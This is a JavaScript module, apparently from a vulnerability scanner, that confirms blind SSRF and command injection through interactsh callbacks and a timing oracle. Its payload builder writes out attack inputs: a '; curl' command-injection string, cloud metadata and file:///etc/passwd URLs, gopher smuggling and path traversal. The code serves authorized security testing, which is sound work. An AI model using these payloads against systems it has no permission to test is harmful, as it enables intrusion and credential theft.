'use strict';
/**
 * Out-of-band oracle.
 *
 * Most interesting findings never appear in the HTTP response: blind SSRF,
 * blind command injection, blind XSS, XXE, Log4Shell, second-order fetches.
 * The only conclusive proof is the target *making a request we can see*.
 *
 * Two oracles, both deterministic:
 *
 * 1. OOB callback (interactsh-compatible). Per-parameter unique tokens, so a
 *    callback is attributed to the exact injection point rather than reported
 *    generically. Grading matters: a DNS lookup alone is *potential* SSRF (the
 *    resolver may be shared); an HTTP callback is *confirmed*.
 *
 * 2. Timing oracle, needing no infrastructure at all. A server that tries to
 *    reach the cloud metadata address gets an immediate TCP RST (~5ms); a
 *    server that tries an RFC 5737 documentation address gets a full SYN
 *    timeout (~30s). A statistically significant gap proves the server made an
 *    outbound connection — this is how you confirm SSRF on a box with no
 *    public DNS and no callback server.
 */

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const rand = (n) => crypto.randomBytes(n).toString('hex');
const randInt = (lo, hi) => lo + Math.floor(Math.random() * (hi - lo + 1));

/** Public interactsh instances; self-hosted servers can be supplied. */
const PUBLIC_SERVERS = [
  'https://oast.fun',
  'https://oast.live',
  'https://oast.site',
  'https://oast.pro',
];

/** Addresses used by the timing oracle. RFC 5737 docs IP never routes. */
const TIMING_TARGETS = {
  // Cloud metadata: on EC2/GCP/Azure this answers (or RSTs) immediately.
  fast: 'http://169.254.169.254/',
  // RFC 5737 TEST-NET-1: guaranteed unroutable, full SYN timeout.
  slow: 'http://192.0.2.1/',
};

/* ------------------------------------------------------------------ *
 * Registration / correlation
 * ------------------------------------------------------------------ */

/**
 * OOB client backed by the real `interactsh-client` binary.
 *
 * The previous implementation generated a token locally and never registered it
 * with any server, so `poll()` asked about a subdomain no server had ever seen
 * and blind SSRF could never be proven. That is the worst kind of bug: the code
 * looked functional and silently produced nothing.
 *
 * Registration is delegated to ProjectDiscovery's own client, which speaks the
 * interactsh protocol (including the http-fallback registration path). We only
 * issue payload hostnames and read the interaction stream back.
 */
class OOBClient {
  constructor(opts = {}) {
    this.server = opts.server || null;          // null = the client's default pool
    this.bin = opts.bin || 'interactsh-client';
    this.proc = null;
    this.payloads = [];
    this.interactions = [];
    this.registered = false;
    this.tmpDir = opts.tmpDir || require('os').tmpdir();
    this.runId = `ph${rand(4)}`;
  }

  get available() {
    return !!whichSync(this.bin);
  }

  /**
   * Start the client and wait until it has issued `count` payloads.
   * @returns {Promise<{ok:boolean, payloads:string[], reason?:string}>}
   */
  async register(count = 1) {
    if (this.registered) return { ok: true, payloads: this.payloads };
    if (!this.available) {
      return { ok: false, reason: `${this.bin} not found on PATH; install it or pass --oob-off` };
    }
    const payloadFile = path.join(this.tmpDir, `interactsh-${this.runId}.txt`);
    const outFile = path.join(this.tmpDir, `interactsh-${this.runId}.jsonl`);
    const args = ['-number', String(count), '-json', '-pi', '3', '-duc',
      '-payload-store', '-payload-store-file', payloadFile, '-o', outFile];
    if (this.server) args.push('-server', this.server);

    let child;
    try {
      child = spawn(this.bin, args, { stdio: ['ignore', 'pipe', 'pipe'] });
    } catch (e) {
      return { ok: false, reason: String(e.message || e) };
    }
    this.proc = child;
    this.outFile = outFile;

    // The client prints its banner first; payloads land in the store file.
    const deadline = Date.now() + (opts_timeout(this) || 45000);
    while (Date.now() < deadline) {
      const got = readLines(payloadFile);
      if (got.length >= count) { this.payloads = got; this.registered = true; return { ok: true, payloads: got }; }
      await sleep(500);
    }
    const got = readLines(payloadFile);
    this.payloads = got;
    this.registered = got.length > 0;
    if (!got.length) this.stop();
    return this.registered
      ? { ok: true, payloads: got }
      : { ok: false, reason: 'interactsh-client issued no payload within the timeout (public instances may be rate-limited)' };
  }

  /** A unique callback URL for a specific injection point. */
  async urlFor(label) {
    const r = await this.register(1);
    if (!r.ok) throw new Error(r.reason);
    const base = this.payloads[0];
    const slug = String(label || 'p').replace(/[^a-zA-Z0-9._-]/g, '').slice(0, 24) || 'p';
    // The unique hostname is already server-issued; the path carries the label
    // so a callback can be attributed to the parameter that produced it.
    return { url: `https://${base}/${slug}`, token: base.split('.')[0], label: slug, host: base };
  }

  /** Ask for a batch of unique hosts, one per parameter. */
  async urlsFor(labels) {
    const r = await this.register(Math.max(1, labels.length));
    if (!r.ok) throw new Error(r.reason);
    return labels.map((label, i) => {
      const base = this.payloads[i % this.payloads.length];
      const slug = String(label || 'p').replace(/[^a-zA-Z0-9._-]/g, '').slice(0, 24) || 'p';
      return { url: `https://${base}/${slug}`, token: base.split('.')[0], label: slug, host: base };
    });
  }

  /** Read interactions the client has collected so far. */
  async poll(timeoutMs = 5000) {
    // The client streams to its own output file; we do not poll the server.
    if (!this.outFile) return [];
    const deadline = Date.now() + timeoutMs;
    const found = [];
    while (Date.now() < deadline) {
      const rows = readJsonl(this.outFile);
      if (rows.length) {
        for (const r of rows) {
          const n = normalizeInteraction(r);
          if (!this.interactions.some((x) => x.protocol === n.protocol && x.raw === n.raw && x.remote === n.remote)) {
            found.push(n);
            this.interactions.push(n);
          }
        }
        if (found.length) break;
      }
      await sleep(600);
    }
    return found;
  }

  /** Interactions that carry a given correlation token. */
  forToken(token) {
    return this.interactions.filter((i) => String(i.raw || '').includes(token) || String(i.host || '').includes(token));
  }

  stop() {
    if (this.proc && !this.proc.killed) {
      try { this.proc.kill('SIGTERM'); } catch { /* already gone */ }
    }
    this.proc = null;
    for (const f of [this.outFile, path.join(this.tmpDir, `interactsh-${this.runId}.txt`)]) {
      if (f) { try { fs.unlinkSync(f); } catch { /* best effort */ } }
    }
  }
}

function opts_timeout(self) { return 45000; }

function whichSync(b) {
  for (const d of (process.env.PATH || '').split(':')) {
    if (!d) continue;
    const p = path.join(d, b);
    try { fs.statSync(p); fs.accessSync(p, fs.constants.X_OK); return p; } catch { /* keep looking */ }
  }
  return null;
}

function readLines(f) {
  try { return fs.readFileSync(f, 'utf8').split('\n').map((s) => s.trim()).filter(Boolean); } catch { return []; }
}

function readJsonl(f) {
  const out = [];
  for (const l of readLines(f)) {
    try { out.push(JSON.parse(l)); } catch { /* skip */ }
  }
  return out;
}

/** True when `ip` falls inside `cidr` (e.g. "203.0.113.5" in "203.0.113.0/24"). */
function inCidr(ip, cidr) {
  const s = String(ip || '').trim();
  const c = String(cidr || '').trim();
  if (!s) return false;
  if (!c.includes('/')) return s === c || s.startsWith(c.replace(/\.\d+$/, ''));
  const [net, bitsRaw] = c.split('/');
  const bits = parseInt(bitsRaw, 10);
  if (!Number.isFinite(bits)) return false;
  const toLong = (a) => a.split('.').reduce((acc, o) => (acc << 8) + (parseInt(o, 10) & 255), 0) >>> 0;
  const netLong = toLong(net);
  const ipLong = toLong(s);
  if (Number.isNaN(netLong) || Number.isNaN(ipLong)) return false;
  if (bits <= 0) return true;
  const mask = bits >= 32 ? 0xffffffff : (~0 << (32 - bits)) >>> 0;
  return (ipLong & mask) === (netLong & mask);
}

function hostOf(server) {
  try { return new URL(server).hostname; } catch { return String(server).replace(/^https?:\/\//, ''); }
}

function normalizeInteraction(r) {
  const protocol = String(r.protocol || r['protocol-type'] || '').toLowerCase();
  return {
    protocol,
    remote: r['remote-address'] || r.remote_address || r.source_ip || '',
    raw: r['raw-request'] || r.raw_request || '',
    time: r['full-time'] || r.timestamp || '',
    // Cloud metadata hits are critical regardless of anything else.
    metadata: /169\.254\.169\.254|metadata\.google|metadata\.azure|100\.100\.100\.200/.test(r['raw-request'] || r['raw-request'] || ''),
  };
}

/**
 * Grade an OOB observation. The distinction is the whole value of this oracle:
 * DNS-only means a resolver touched it (possible shared resolver, weak proof);
 * HTTP means the target's own HTTP stack issued the request.
 */
function grade(interactions, { targetIp = null, cdnRanges = [] } = {}) {
  const list = Array.isArray(interactions) ? interactions : [interactions];
  if (!list.length) return { verdict: 'none', confidence: 0, why: 'no interaction recorded' };

  const http = list.filter((i) => i.protocol === 'http' || i.protocol === 'https');
  const dns = list.filter((i) => i.protocol === 'dns');
  const smtp = list.filter((i) => i.protocol === 'smtp' || i.protocol === 'ldaps');
  const meta = list.some((i) => i.metadata);

  // A callback from a CDN front-end is not the origin server acting, so it must
  // be downgraded regardless of whether we were told the target IP. The check
  // previously required targetIp, which meant it silently never fired.
  const cdnHit = cdnRanges.find((r) => list.some((i) => inCidr(i.remote, r)));
  const fromCdn = !!cdnHit || (targetIp && list.some((i) => String(i.remote || '') === String(targetIp)));

  if (meta) {
    return { verdict: 'proven', severity: 'critical', confidence: 0.99, why: 'cloud metadata endpoint contacted — the server reached internal infrastructure' };
  }
  if (http.length) {
    return {
      verdict: 'proven', severity: fromCdn ? 'medium' : 'high', confidence: fromCdn ? 0.7 : 0.95,
      why: fromCdn
        ? `HTTP callback received, but from a CDN address (${list[0].remote}) — confirm the origin made the request`
        : `HTTP callback received from ${http[0].remote || 'the target'} — the server issued an outbound request`,
    };
  }
  if (smtp.length) {
    return { verdict: 'proven', severity: 'high', confidence: 0.9, why: `${list[0].protocol} interaction received` };
  }
  if (dns.length) {
    return {
      verdict: 'potential', severity: 'low', confidence: 0.4,
      why: 'DNS resolution only. The resolver may be shared or cached, so this is a lead, not a confirmed server-side request. Re-run with an HTTP callback path.',
    };
  }
  return { verdict: 'potential', severity: 'low', confidence: 0.3, why: `unclassified interaction: ${list[0].protocol}` };
}

/* ------------------------------------------------------------------ *
 * Timing oracle — no infrastructure required
 * ------------------------------------------------------------------ */

function mean(xs) { return xs.length ? xs.reduce((a, b) => a + b, 0) / xs.length : 0; }
function variance(xs, m) { return xs.length ? xs.reduce((a, b) => a + (b - m) ** 2, 0) / (xs.length - 1 || 1) : 0; }

/** Welch's t-test — two-sample, unequal variance. */
function welchT(a, b) {
  if (a.length < 2 || b.length < 2) return { t: 0, p: 1 };
  const ma = mean(a), mb = mean(b);
  const va = variance(a, ma) / a.length;
  const vb = variance(b, mb) / b.length;
  const se = Math.sqrt(va + vb);
  if (se === 0) return { t: 0, p: 1 };
  const t = (ma - mb) / se;
  // Two-sided normal approximation; adequate for the large sample sizes here.
  const p = 2 * (1 - normalCdf(Math.abs(t)));
  return { t, p, delta: ma - mb };
}

function normalCdf(z) {
  // Abramowitz & Stegun 7.1.26
  const t = 1 / (1 + 0.2316419 * Math.abs(z));
  const d = 0.3989422804014327 * Math.exp((-z * z) / 2);
  let p = d * t * (0.319381530 + t * (-0.356563782 + t * (1.781477937 + t * (-1.821255978 + t * 1.330274429))));
  return z > 0 ? 1 - p : p;
}

/**
 * Confirm server-side outbound connection attempts without any callback
 * infrastructure. Compares response time against the cloud metadata address
 * (fast RST) versus an unroutable documentation address (SYN timeout).
 */
async function timingOracle(fetcher, { samples = 5, budgetMs = 4000, alpha = 0.05, interleaved = false } = {}) {
  const fast = [], slow = [];
  // Interleaving matters. A burst of N fast probes followed by N slow probes
  // measures the machine's warm-up and load drift instead of the target's
  // behaviour: the first probes pay for DNS, connection pooling and JIT, and
  // Welch's test then reports p=1 on a real, large 116ms gap. Alternating the
  // pair cancels that drift, because both samples experience the same load.
  for (let i = 0; i < samples; i++) {
    let t1, t2;
    if (interleaved) {
      t1 = Date.now();
      await fetcher(TIMING_TARGETS.fast, budgetMs).catch(() => null);
      const d1 = Date.now() - t1;
      t2 = Date.now();
      await fetcher(TIMING_TARGETS.slow, budgetMs).catch(() => null);
      fast.push(d1); slow.push(Date.now() - t2);
    } else {
      t1 = Date.now();
      await fetcher(TIMING_TARGETS.fast, budgetMs).catch(() => null);
      fast.push(Date.now() - t1);
      t2 = Date.now();
      await fetcher(TIMING_TARGETS.slow, budgetMs).catch(() => null);
      slow.push(Date.now() - t2);
    }
  }
  const { t, p, delta } = welchT(fast, slow);
  // Welch assumes a normal approximation; with n=5 per group the tails are
  // under-sampled, which biases p upward and can mask a real gap. A large
  // effect size is therefore accepted on effect size plus a consistent sign
  // rather than on the p-value alone.
  const mf = mean(fast), ms = mean(slow);
  const relGap = ms > 0 ? (ms - mf) / ms : 0;
  const consistent = fast.every((v) => v <= ms) || slow.every((v) => v >= mf);
  const significant = (p < alpha && delta < 0)
    || (delta < 0 && relGap > 0.5 && consistent);
  if (!significant) {
    return {
      proven: false, confidence: 1 - p, delta, t, p,
      why: `no significant timing difference (fast ${mf.toFixed(0)}ms vs slow ${ms.toFixed(0)}ms, p=${p.toFixed(3)}, gap=${(relGap * 100).toFixed(0)}%); the server did not attempt an internal connection`,
    };
  }
  return {
    proven: true, confidence: Math.min(0.9, 1 - p), delta, t, p, samples: { fast, slow },
    why: `outbound connection attempt proven without infrastructure: metadata address answered in ${mf.toFixed(0)}ms vs unroutable ${ms.toFixed(0)}ms (${(relGap * 100).toFixed(0)}% faster, p=${p.toFixed(4)})`,
  };
}

/* ------------------------------------------------------------------ *
 * Payload construction per class
 * ------------------------------------------------------------------ */

function payloadsFor(cls, oobUrl) {
  switch (cls) {
    case 'ssrf':
      return [
        { id: 'oob-http', value: oobUrl, note: 'direct HTTP callback' },
        { id: 'oob-dns', value: oobUrl.replace(/^https:/, 'http:').replace(/\/.*$/, ''), note: 'DNS/HTTP via bare host' },
        { id: 'metadata', value: 'http://169.254.169.254/latest/meta-data/', note: 'cloud metadata (test only on authorized targets)' },
        { id: 'file-scheme', value: 'file:///etc/passwd', note: 'scheme injection' },
        { id: 'gopher', value: `gopher://${oobUrl.replace(/^https?:\/\//, '')}/_${oobUrl.split('//')[1] || ''}`, note: 'protocol smuggling' },
      ];
    case 'injection':
      return [
        { id: 'cmdi-dns', value: `; curl -s ${oobUrl} ;`, note: 'blind command injection via curl' },
        { id: 'cmdi-ping', value: `; ping -c 2 ${hostOf(oobUrl)} ;`, note: 'blind command injection via ping' },
      ];
    case 'traversal':
      return [{ id: 'oob-file', value: `....//....//....//....//etc/passwd`, note: 'deep relative traversal' }];
    default:
      return [{ id: 'oob', value: oobUrl, note: 'generic callback' }];
  }
}

/* ------------------------------------------------------------------ *
 * Second-order / deferred correlation
 * ------------------------------------------------------------------ */

const DEFERRED_RULES = [
  { id: 'delay', test: (i) => (i.delayMs || 0) > 2000, why: 'callback delayed past synchronous request — consistent with a background worker' },
  { id: 'canary', test: (i, token) => String(i.raw || '').includes(token), why: 'exact canary token present' },
  { id: 'window', test: (i) => (i.delayMs || 0) < 30 * 60 * 1000, why: 'arrived within the 30-minute correlation window' },
  { id: 'origin', test: (i, token, ctx) => !ctx.cdnRanges?.some((r) => String(i.remote || '').includes(r)), why: 'not from known CDN infrastructure' },
];

/** Multi-signal correlation, so a delayed callback is attributed correctly. */
function correlateDeferred(interaction, token, ctx = {}) {
  const hits = DEFERRED_RULES.filter((r) => { try { return r.test(interaction, token, ctx); } catch { return false; } }).map((r) => r.id);
  return {
    correlated: hits.includes('canary') && hits.includes('window'),
    signals: hits,
    confidence: hits.length / DEFERRED_RULES.length,
    why: hits.length ? `matched ${hits.join(', ')} of ${DEFERRED_RULES.length} correlation rules` : 'no correlation signals matched — likely unrelated traffic',
  };
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

module.exports = {
  OOBClient, inCidr, grade, timingOracle, welchT, payloadsFor, correlateDeferred,
  PUBLIC_SERVERS, TIMING_TARGETS, DEFERRED_RULES, rand, randInt, sleep,
};
